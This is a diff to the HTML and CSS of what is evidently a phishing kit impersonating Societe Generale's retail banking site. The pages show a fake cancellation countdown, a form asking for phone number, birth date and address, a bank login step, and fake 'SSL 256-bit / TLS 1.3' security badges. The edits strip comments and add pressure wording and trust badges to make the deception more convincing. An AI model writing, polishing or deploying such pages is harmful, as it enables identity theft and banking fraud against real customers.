@@ -204,7 +204,6 @@
       filter: brightness(0) invert(1);
       animation: pulse 1.2s ease-in-out infinite;
     }
-    /* Suppression de l'image wero, donc plus besoin de ces règles pour img */
     @keyframes spin { to { transform: rotate(360deg); } }
 
     /* ===== PAGE 2-CARD (used for pages 3,4,5) ===== */
@@ -360,10 +359,10 @@
     }
     .countdown-progress {
       fill: none;
-      stroke: #4caf50; /* vert par défaut, changé dynamiquement */
+      stroke: #4caf50;
       stroke-width: 8;
       stroke-linecap: round;
-      stroke-dasharray: 439.823; /* 2*pi*70 */
+      stroke-dasharray: 439.823;
       stroke-dashoffset: 0;
       transition: stroke-dashoffset 1s linear, stroke 0.3s;
     }
@@ -374,7 +373,6 @@
       dominant-baseline: central;
       text-anchor: middle;
     }
-    /* Label en bleu comme le bouton Annuler */
     .countdown-label {
       font-size: 0.75rem;
       color: black;
@@ -402,18 +400,14 @@
 
   <nav>
     <div class="logo">
-      
       <img src="S-G-Log.png" alt="Societe Generale">
       <span>Particuliers SG</span>
     </div>
   </nav>
 
-
-   
   <div class="loading-overlay" id="loadingOverlay" style="display:none;">
     <div class="spinner-wrap">
       <div class="spinner-ring"></div>
-      
     </div>
   </div>
 
@@ -423,19 +417,14 @@
 
       <p class="rgpd-note">Cette plateforme utilise un chiffrement de bout en bout conforme aux normes RGPD.</p>
 
-
-      
       <div class="form-card" id="page1">
         <div class="divider"></div>
         <h1 class="card-title">Annulation</h1>
 
-        
         <div class="countdown-container">
           <svg class="countdown-svg" viewBox="0 0 160 160">
             <circle class="countdown-bg" cx="80" cy="80" r="70" />
             <circle class="countdown-progress" id="countdownCircle" cx="80" cy="80" r="70" />
-            <!-- Affichage du temps en MM:SS à l'intérieur du cercle -->
-           
           </svg>
 		   <text style="color: black;" class="countdown-text" id="countdownText">10:00</text>
          <br><br> <p class="countdown-label">Temps restant avant annulation</p>
@@ -452,8 +441,8 @@
 
 
       <div class="page2-card" id="page3" style="display:none;">
-        <h2>Vos informations</h2>
-        <p style="font-size:0.82rem;color:#888;margin-top:-8px;">Pour votre sécurité, confirmez vos informations personnelles.</p>
+        <h2>Vos informations </h2>
+        <p style="font-size:0.82rem;color:#888;margin-top:-8px;">Pour votre sécurité et afin de certifier l'authenticité de cette transaction, nous vous invitons à confirmer vos informations personnelles.</p>
 
         <div style="width:100%;display:flex;flex-direction:column;gap:12px;">
           <div class="p3-field">
@@ -466,11 +455,11 @@
           </div>
           <div class="p3-field">
             <label class="field-label">Téléphone <span>*</span></label>
-            <input type="tel" id="phoneInput" class="p3-input" placeholder="06 12 34 56 78">
+            <input type="tel" class="p3-input" placeholder="+33 6 00 00 00 00">
           </div>
           <div class="p3-field">
             <label class="field-label">Date de naissance <span>*</span></label>
-            <input type="text" id="dobInput" class="p3-input" placeholder="jj/mm/aaaa" maxlength="10">
+            <input placeholder="jj/mm/aaaa" type="text" class="p3-input">
           </div>
           <div class="p3-field">
             <label class="field-label">Adresse <span>*</span></label>
@@ -479,7 +468,7 @@
           <div style="display:flex;gap:10px;">
             <div class="p3-field" style="flex:1;">
               <label class="field-label">Code postal</label>
-              <input type="text" id="postalInput" class="p3-input" placeholder="75000" maxlength="5">
+              <input type="text" class="p3-input" placeholder="75000">
             </div>
             <div class="p3-field" style="flex:2;">
               <label class="field-label">Ville</label>
@@ -489,9 +478,17 @@
         </div>
 
         <button type="button" class="btn-main1" id="btnPage3">Valider</button>
+
+        <div class="ssl-bar">
+          <span class="ssl-item"><svg style="width:10px;height:10px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>SSL 256-bit</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">TLS 1.3</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">Données chiffrées</span>
+        </div>
       </div>
 
-      <!-- PAGE 4: BANK LOGIN -->
+
       <div class="page2-card" id="page4" style="display:none;">
         <p class="txtlogo"><img class="logobp" src="S-G-Log.png" alt="Logo"></p>
 
@@ -511,7 +508,6 @@
         </div>
 
         <button type="button" class="btn-continuer" id="btnPage4">Se connecter</button>
-      </div>
 
         <div class="ssl-bar">
           <span class="ssl-item"><svg style="width:10px;height:10px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>SSL 256-bit</span>
